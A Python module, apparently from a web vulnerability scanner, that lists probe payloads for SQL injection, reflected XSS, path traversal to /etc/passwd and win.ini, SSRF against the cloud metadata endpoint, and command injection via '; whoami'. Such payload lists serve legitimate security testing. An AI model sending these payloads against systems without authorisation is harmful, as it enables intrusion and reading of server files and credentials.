from dataclasses import dataclass
from typing import Dict, List


@dataclass(frozen=True)
class PayloadTemplate:
    name: str
    method: str
    payload: str
    notes: str


VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
    "sqli": [
        PayloadTemplate(
            name="boolean-auth-bypass",
            method="GET",
            payload="' OR '1'='1' --",
            notes="Classic boolean-based SQL injection probe.",
        ),
        PayloadTemplate(
            name="union-probe",
            method="GET",
            payload="' UNION SELECT NULL,NULL,NULL --",
            notes="Tests for column-count mismatch and reflected data.",
        ),
    ],
    "xss": [
        PayloadTemplate(
            name="script-reflection",
            method="GET",
            payload="<script>confirm(document.domain)</script>",
            notes="Minimal reflected XSS probe.",
        ),
        PayloadTemplate(
            name="img-onerror",
            method="GET",
            payload="<img src=x onerror=confirm(1)>",
            notes="Fallback payload for HTML contexts that strip script tags.",
        ),
    ],
    "path_traversal": [
        PayloadTemplate(
            name="unix-passwd",
            method="GET",
            payload="../../../../etc/passwd",
            notes="Reads a well-known file if traversal is possible.",
        ),
        PayloadTemplate(
            name="windows-winini",
            method="GET",
            payload="..\\..\\..\\..\\Windows\\win.ini",
            notes="Windows traversal probe.",
        ),
    ],
    "ssrf": [
        PayloadTemplate(
            name="loopback",
            method="GET",
            payload="http://127.0.0.1:80",
            notes="Checks whether the server can be induced to fetch loopback resources.",
        ),
        PayloadTemplate(
            name="metadata",
            method="GET",
            payload="http://169.254.169.254/latest/meta-data/",
            notes="Cloud metadata service probe.",
        ),
    ],
    "rce": [
        PayloadTemplate(
            name="command-echo",
            method="POST",
            payload="; echo CODE_SENTINEL_RCE_TEST",
            notes="Low-risk command execution probe that echoes a marker.",
        ),
        PayloadTemplate(
            name="whoami",
            method="POST",
            payload="; whoami",
            notes="Confirms command execution with a harmless identity readout.",
        ),
    ],
}


def templates_for(vuln_type: str) -> List[PayloadTemplate]:
    return VULN_PAYLOADS.get(vuln_type, [])
